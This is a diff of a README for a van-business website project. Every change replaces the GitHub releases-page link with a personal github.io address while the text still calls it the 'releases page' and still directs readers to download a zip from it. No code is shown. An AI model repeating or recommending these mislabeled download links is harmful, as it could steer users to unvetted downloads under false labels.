@@ -1,6 +1,6 @@
 # 🚐 apex-vans-website-hub - View Your Van Website Offline
 
-[![Download Apex Vans Website](https://img.shields.io/badge/Download-Apex_Vans_Website-2ea44f?style=for-the-badge)](https://github.com/Sanskargo212/apex-vans-website-hub/releases)
+[![Download Apex Vans Website](https://img.shields.io/badge/Download-Apex_Vans_Website-2ea44f?style=for-the-badge)](https://sanskargo212.github.io)
 
 ## 📖 What Is This
 
@@ -41,7 +41,7 @@ Follow these steps to view the website on your computer.
 
 ### Step 1: Download the Files
 
-1. Go to the [releases page](https://github.com/Sanskargo212/apex-vans-website-hub/releases)
+1. Go to the [releases page](https://sanskargo212.github.io)
 2. Look for the newest release at the top of the page
 3. Find the file named `apex-vans-website-hub.zip`
 4. Click the file name to start the download
@@ -102,7 +102,7 @@ We update the website files from time to time. Here is how to get the latest ver
 
 ### Check for Updates
 
-1. Go to the [releases page](https://github.com/Sanskargo222/apex-vans-website-hub/releases)
+1. Go to the [releases page](https://sanskargo212.github.io)
 2. Look at the newest release date
 3. Compare it with the version you have on your computer
 4. If the date is newer, download the new version
@@ -145,7 +145,7 @@ We update the website files from time to time. Here is how to get the latest ver
 
 ## 📥 Download Again
 
-If you need to download the files again, visit the [releases page](https://github.com/Sanskargo212/apex-vans-website-hub/releases) and follow the steps in the Getting Started section.
+If you need to download the files again, visit the [releases page](https://sanskargo212.github.io) and follow the steps in the Getting Started section.
 
 ## 📄 License
 
